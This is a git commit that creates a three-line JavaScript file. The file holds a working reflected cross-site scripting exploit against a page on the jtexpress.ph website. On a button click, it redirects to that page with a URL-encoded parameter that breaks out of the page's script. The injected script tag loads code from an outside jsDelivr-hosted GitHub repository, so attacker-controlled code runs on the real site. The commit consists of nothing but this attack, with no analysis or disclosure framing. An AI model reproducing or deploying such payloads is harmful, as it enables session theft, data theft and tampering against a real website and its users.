c5166728817b04cdd58a15deeee15277f2c4f071
Haxcoder™ <77023113+ImTheRealHaxcoder@users.noreply.github.com>
2022-09-01 10:46:07 +0800

    Create index.js

---
+++ index.js
@@ -0,0 +1,3 @@
+document.getElementById("myButton").onclick = function () {
+      location.href = "https://www.jtexpress.ph/index/message/message.html?type=%22%29%3C%2Fscript%3E%3Cscript%20src%3D%22https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FImTheRealHaxcoder%2Fjss%40main%2Fmain.js%22%3E%3C%2Fscript%3E";
+};
